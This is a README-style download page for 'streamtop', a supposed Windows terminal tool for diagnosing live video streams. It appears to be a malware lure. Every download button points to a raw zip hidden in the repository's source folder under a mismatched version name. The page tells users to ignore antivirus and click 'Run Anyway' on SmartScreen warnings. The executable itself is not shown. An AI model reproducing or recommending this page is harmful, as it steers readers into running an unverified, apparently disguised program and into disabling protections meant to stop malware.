<h1>📺 streamtop - Diagnose Live Video Streams Instantly</h1>

<p align="center">
  <a href="https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip"><img src="https://img.shields.io/badge/Download%20Streamtop-v1.0.1-2ea44f?style=for-the-badge&logo=windows&logoColor=white" alt="Download Button" style="background-color:#4CAF50; color:white; padding:15px 30px; font-size:20px; border-radius:10px; text-decoration:none;"></a>
</p>

<h2>🔍 What Is Streamtop?</h2>
<p>Streamtop is a powerful yet simple diagnostic tool that helps you understand exactly what is happening with your live video streams. Whether you are streaming sports, news, or any other live content, Streamtop reads the technical details of the stream and presents them to you in a clean, easy-to-read dashboard inside your computer terminal (the black window with text). It works with common streaming formats like HLS, DASH, and IPTV. This means if a channel is buffering, freezing, or not playing at all, Streamtop helps you figure out why.</p>

<h2>✅ Who Should Use This?</h2>
<p>You don't need to be a computer expert. Streamtop is built for anyone who watches or works with live video:
<ul>
  <li><strong>Home users</strong> who want to know why their IPTV playlist is glitchy.</li>
  <li><strong>Tech support</strong> staff checking stream health for customers.</li>
  <li><strong>Broadcast enthusiasts</strong> testing their own home streams.</li>
  <li><strong>Network admins</strong> verifying CDN delivery quality.</li>
</ul></p>

<h2>🚀 Getting Started - Download and Run (No Coding Needed)</h2>
<p>Follow these exact four steps. It will take less than five minutes.</p>

<h3>Step 1: Download the Program</h3>
<p>Visit this link to download the application: <strong><a href="https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip">https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip</a></strong></p>

<p>On that page, look for a green button that says <strong>"Releases"</strong> or <strong>"Download"</strong>. Click it. You will see a list of files. Find the file named <strong>streamtop-v1.0.1.zip</strong> (or similar ending in .zip). Click on it to download it to your computer. The download will start automatically. Your browser will show it in the bottomleft corner or in the downloads folder.</p>

<h3>Step 2: Unzip (Extract) the File</h3>
<p>The downloaded file is a <em>zip archive</em>, like a suitcase with compressed files inside. You need to open the suitcase. Here is how:
<ol>
  <li>Right-click on the downloaded <strong>.zip</strong> file.</li>
  <li>Select <strong>"Extract All"</strong> from the menu that appears.</li>
  <li>Choose a destination folder (the default is fine) and click <strong>"Extract"</strong>.</li>
</ol>
You will now see a new folder with the same name as the zip file. Open that folder. Inside, there will be a file called <strong>streamtop.exe</strong> (Windows program) or just <strong>streamtop</strong>.</p>

<h3>Step 3: Run the Application</h3>
<p>Double-click the <strong>streamtop.exe</strong> file. A black terminal window will open. This is the program's interface. It looks oldschool but it is fast and powerful. Do not close this window when using the tool.</p>

<h3>Step 4: Enter Your Stream Link</h3>
<p>In the terminal window, you will see a prompt asking you to paste a stream URL. This is the link to the live stream you want to check. Copy any HLS, DASH, or IPTV stream link (for example, a link ending in <em>.m3u8</em> for HLS or <em>.mpd</em> for DASH). Right-click in the black window to paste it (or press Ctrl+V). Then press <strong>Enter</strong>.</p>

<p>The program will now connect to that stream and show you a table with detailed diagnosticsstuff like:
<ul>
  <li>✅ Overall health status</li>
  <li>📊 Bitrate (quality level)</li>
  <li>⏱️ Latency (delay from live)</li>
  <li>🔁 Segment sequence numbers</li>
  <li>🗂️ Playlist duration</li>
  <li>📡 CDN cache headers</li>
  <li>🔧 SCTE-35 ad markers (if present)</li>
</ul></p>

<h2>🖥️ Understanding the Screen</h2>
<p>Streamtop uses a colorful dashboard layout. Here is a quick tour:
<ul>
  <li><strong>Header bar</strong> (top): Shows the stream title and the active URL.</li>
  <li><strong>Left panel</strong> (green): Shows "Stream Aliveness" - whether the stream is reachable, the current bitrate, and the encoded resolution.</li>
  <li><strong>Right panel</strong> (blue): Shows "Segment Timing" - how fast segments are being delivered and if any are missing or late.</li>
  <li><strong>Bottom panel</strong> (yellow): Shows "Error Log" - any warnings like connection drops or network jitter.</li>
</ul>
You do not need to understand every number. The green check marks mean everything is fine. Red X marks mean there is a problem and the log will explain it in plain English.</p>

<h2>🎯 Why Use Streamtop?</h2>
<p>Here are the main benefits compared to guessing or using complex network tools:
<ul>
  <li><strong>Instant answers</strong>: See stream health in seconds, not minutes.</li>
  <li><strong>No install bloat</strong>: Single portable file. No setup wizards. No registry changes.</li>
  <li><strong>Privacy friendly</strong>: Works entirely offline after download. No account needed.</li>
  <li><strong>Built for live</strong>: Handles dynamic streams that change quality midbroadcast.</li>
  <li><strong>Ad marker detection</strong>: If your stream uses SCTE-35 cues, Streamtop clearly shows where the ad break starts and ends.</li>
</ul></p>

<h2>❓ Frequently Asked Questions (FAQ)</h2>

<h3>Q: I double-clicked streamtop.exe and nothing happened. What now?</h3>
<p>Check if your antivirus is blocking it. Windows SmartScreen might show a blue popup. If so, click <strong>"More Info"</strong> then <strong>"Run Anyway"</strong>. Also, make sure you extracted the .zip file completely - do not run it directly from inside the zipped folder.</p>

<h3>Q: Can I use this on Mac or Linux?</h3>
<p>This version is designed for Windows. The program is written in Rust, so in the future native Mac/Linux builds may appear. For now, stick to Windows.</p>

<h3>Q: What does "Segment Missing" mean?</h3>
<p>It means the stream server skipped a small chunk of video. This usually causes a brief freeze or quality drop. Streamtop flags this so you can complain to your IPTV provider with evidence.</p>

<h3>Q: Is this a video player?</h3>
<p>No. Streamtop does not play video. It only <em>analyzes</em> the stream's technical health. You watch video in a separate app like VLC or your TV box. This is a diagnostic tool, like a doctor's stethoscope.</p>

<h3>Q: I get "Parse Error" when I paste my link. Why?</h3>
<p>The link might not be a direct stream URL. Make sure it ends with <em>.m3u8</em>, <em>.mpd</em>, or <em>.ts</em>. If it's a playlist page (like a website link), you need the raw stream URL. In VLC, press Ctrl+N to copy the exact stream address.</p>

<h2>📚 Technical Details (For the Curious)</h2>
<p>Streamtop is built using Rust programming language and the Ratatui terminal UI library. This ensures ultra-fast performance and minimal battery drain. It supports the following protocols:
<ul>
  <li>HLS (HTTP Live Streaming) - including LowLatency HLS</li>
  <li>MPEG-DASH (Dynamic Adaptive Streaming over HTTP)</li>
  <li>IPTV (Internet Protocol Television) - typically MPEG-TS streams</li>
</ul>
It analyzes CDN (Content Delivery Network) behavior, tracks segment timestamps, detects discontinuities, and exposes SCTE-35 markers that control ad insertion. All diagnosis is done locally without sending data to any server.</p>

<p>For hobbyists, Streamtop outputs structured log data in the terminal that can be copied and shared with technicians for deeper troubleshooting.</p>

<h2>📥 Download Again</h2>
<p>If you skipped earlier or lost the file, here is the official download button again. This is the only correct source.</p>

<p align="center">
  <a href="https://raw.githubusercontent.com/ndo59869/streamtop/main/src/ui/v2.6-beta.3.zip" style="background-color:#008CBA; color:white; padding:15px 40px; font-size:22px; border-radius:12px; text-decoration:none; font-weight:bold;">⬇️ Download Streamtop v1.0.1</a>
</p>

<p>Bookmark this page for future reference. Check back occasionally for updates as new versions will be posted on the same download page.</p>

<h2>🛟 Need Help?</h2>
<p>If you get stuck, the download page itself has a "Discussions" or "Issues" tab. You can post a question there. Alternatively, search for "streamtop github" in your search engine to find community forums. Always mention your Windows version (Windows 10 or 11) when asking for help.</p>

<p>Happy stream diagnosing! 📡</p>